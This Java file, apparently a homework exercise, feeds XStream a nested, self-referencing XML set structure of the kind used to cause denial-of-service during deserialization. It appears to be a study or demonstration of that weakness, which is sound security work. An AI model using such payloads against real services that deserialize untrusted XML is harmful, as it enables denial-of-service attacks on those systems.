package hm2;

import com.thoughtworks.xstream.XStream;


public class XStreamExample {
    public static void main(String[] args) {
        XStream xstream = new XStream();

        String modifiedXml = "<set>\n" +
                "  <set>\n" +
                "    <set>\n" +
                "      <set>\n" +
                "        <set>\n" +
                "          <set>\n" +
                "            <set>\n" +
                "              <string>a</string>\n" +
                "            </set>\n" +
                "            <set>\n" +
                "              <string>b</string>\n" +
                "            </set>\n" +
                "          </set>\n" +
                "          <set>\n" +
                "            <string>c</string>\n" +
                "            <set reference='../../../set/set[2]'/>\n" +
                "          </set>\n" +
                "        </set>\n" +
                "      </set>\n" +
                "    </set>\n" +
                "  </set>\n" +
                "</set>";

        System.out.println(modifiedXml);
        xstream.fromXML(modifiedXml);
    }
}